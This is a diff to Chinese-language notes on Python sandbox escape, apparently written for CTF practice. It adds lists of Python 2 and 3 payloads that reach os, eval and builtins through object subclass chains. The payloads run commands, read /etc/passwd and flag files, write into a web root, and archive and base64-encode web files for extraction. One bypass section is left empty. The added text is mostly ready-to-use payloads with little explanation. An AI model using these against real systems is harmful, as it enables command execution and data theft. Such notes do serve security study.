@@ -148,9 +148,57 @@ os.system('ls')
 execfile('/usr/lib/python2.7/os.py')
 system('ls')
 ```
+## **Python2 POC**
+```python
+#命令执行payload
+[].__class__.__base__.__subclasses__()[69].__init__.__globals__['os'].system('calc')
+"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
+"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')
+"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'__import__("os").system("calc")')
+''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals['linecache'].os.popen('calc').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('calc')
+().__class__.__bases__[0].__subclasses__()[60]()._module.__builtins__['__import__']('os').system('calc')
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]["eval"]("__import__('os').system('calc')")
+# Or you could obtain the builtins from a defined function
+get_flag.__globals__['__builtins__']['__import__']("os").system("ls")
+```
+```python
+#读取文件
+"".__class__.__mro__[-1].__subclasses__()[40]("D:/flag").read()
+```
+## **Python3 POC**
+```python
+# read 函数，读文件
+''.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__['__builtins__']['open']('/etc/passwd').read()
+().__class__.__bases__[0].__subclasses__()[40]('abc.php').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("open('/etc/passwd').read()")
+# write 函数，写文件
+().__class__.__bases__[0].__subclasses__()[40]('/var/www/html/input', 'w').write('123')
+# 执行任意命令
+().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /var/www/html").read()' )
+# 通过 system 执行任意命令
+[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('id')
+''.__class__.__base__.__subclasses__()[80].__init__.__globals__["sys"].modules["os"].system("whoami")
+# 通过 popen 执行任意命令
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('id').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').system('ls')
+().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /etc/passwd').read()
+().__class__.__bases__[0].__subclasses__()[59].__init__.['__builtins__']['__import__']('subprocess').Popen(['cat', '/etc/passwd']).read()
+# 打包文件
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('tar -czvf /tmp/www.tar.gz /home/ctf/www').read()
+# base64 编码读取文件
+().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__('func_globals')['linecache'].__dict__['os'].__dict__['popen']('base64 /tmp/www.tar.gz').read()
+```
+## **花式绕过总结**
+### 绕过空格
+
+###
+
 ## 参考资料
 【Escaping the Python Sandbox】https://zolmeister.com/2013/05/escaping-python-sandbox.html<br>
 【Sandbox Escape with Python】https://prog.world/sandbox-escape-with-python/<br>
 【】http://www.secwk.com/2019/10/17/11283/<br>
 【】https://www.cnblogs.com/tr1ple/p/9415641.html<br>
 【】https://www.freebuf.com/articles/system/203208.html<br>
+【】https://0day.work/jinja2-template-injection-filter-bypasses/<br>
+【】https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes<br>
